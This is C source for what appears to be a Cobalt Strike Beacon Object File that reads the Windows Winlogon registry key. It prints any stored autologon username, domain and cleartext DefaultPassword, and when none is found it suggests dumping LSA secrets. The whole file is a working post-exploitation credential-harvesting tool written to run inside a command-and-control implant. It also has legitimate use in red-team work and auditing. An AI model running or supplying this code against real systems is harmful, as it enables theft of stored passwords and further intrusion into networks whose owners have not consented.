#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

DWORD CheckAutologonCredentials(void)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD dwSize = 0;
    DWORD dwType = 0;
    char szAutoLogon[16] = {0};
    char szUserName[256] = {0};
    char szDomain[256] = {0};
    char szPassword[256] = {0};
    BOOL bAutoLogonFound = FALSE;
    BOOL bUserNameFound = FALSE;
    BOOL bDomainFound = FALSE;
    BOOL bPasswordFound = FALSE;
    LONG lResult = 0;

    lResult = ADVAPI32$RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0,
        KEY_READ,
        &hKey
    );

    if (lResult != ERROR_SUCCESS)
    {
        internal_printf("[!] Failed to open Winlogon registry key (error: 0x%lX)\n", lResult);
        dwErrorCode = lResult;
        goto CheckAutologonCredentials_end;
    }

    // Query AutoAdminLogon (stored as REG_SZ "0" or "1")
    dwSize = sizeof(szAutoLogon);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "AutoAdminLogon",
        NULL,
        &dwType,
        (LPBYTE)szAutoLogon,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] AutoAdminLogon: %s\n", szAutoLogon);
        bAutoLogonFound = TRUE;
    }

    // Query DefaultDomainName
    dwSize = sizeof(szDomain);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "DefaultDomainName",
        NULL,
        &dwType,
        (LPBYTE)szDomain,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS && szDomain[0] != '\0')
    {
        internal_printf("[*] DefaultDomainName: %s\n", szDomain);
        bDomainFound = TRUE;
    }

    // Query DefaultUserName
    dwSize = sizeof(szUserName);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "DefaultUserName",
        NULL,
        &dwType,
        (LPBYTE)szUserName,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[*] DefaultUserName: %s\n", szUserName);
        bUserNameFound = TRUE;
    }

    // Query DefaultPassword
    dwSize = sizeof(szPassword);
    lResult = ADVAPI32$RegQueryValueExA(
        hKey,
        "DefaultPassword",
        NULL,
        &dwType,
        (LPBYTE)szPassword,
        &dwSize
    );
    if (lResult == ERROR_SUCCESS)
    {
        internal_printf("[+] DefaultPassword: %s\n", szPassword);
        bPasswordFound = TRUE;
    }

    // Report missing values
    if (!bAutoLogonFound)
    {
        internal_printf("[-] AutoAdminLogon: Not Found\n");
    }
    if (!bUserNameFound)
    {
        internal_printf("[-] DefaultUserName: Not Found\n");
    }
    if (!bPasswordFound)
    {
        internal_printf("[-] DefaultPassword: Not Found\n");
    }

    // Summary
    internal_printf("\n");
    if (bAutoLogonFound && szAutoLogon[0] == '1' && bPasswordFound)
    {
        internal_printf("[+] VULNERABLE: Autologon credentials stored in registry!\n");
        if (bDomainFound)
        {
            internal_printf("[+] Credentials: %s\\%s:%s\n", szDomain, szUserName, szPassword);
        }
        else
        {
            internal_printf("[+] Credentials: %s:%s\n", szUserName, szPassword);
        }
    }
    else if (bAutoLogonFound && szAutoLogon[0] == '1')
    {
        internal_printf("[*] AutoAdminLogon enabled but no DefaultPassword found\n");
        internal_printf("[*] Password may be stored in LSA secrets (use lsadump)\n");
    }
    else
    {
        internal_printf("[-] Not vulnerable: Autologon not enabled or no credentials stored\n");
    }

CheckAutologonCredentials_end:
    if (hKey != NULL)
    {
        ADVAPI32$RegCloseKey(hKey);
        hKey = NULL;
    }

    return dwErrorCode;
}

#ifdef BOF
VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    DWORD dwErrorCode = ERROR_SUCCESS;

    if (!bofstart())
    {
        return;
    }

    internal_printf("=== Autologon Credentials Check ===\n\n");

    dwErrorCode = CheckAutologonCredentials();
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "CheckAutologonCredentials failed: %lX\n", dwErrorCode);
        goto go_end;
    }

go_end:
    printoutput(TRUE);
    bofstop();
}
#else
int main(int argc, char **argv)
{
    DWORD dwErrorCode = ERROR_SUCCESS;

    internal_printf("=== Autologon Credentials Check ===\n\n");

    dwErrorCode = CheckAutologonCredentials();
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "CheckAutologonCredentials failed: %lX\n", dwErrorCode);
        goto main_end;
    }

main_end:
    return dwErrorCode;
}
#endif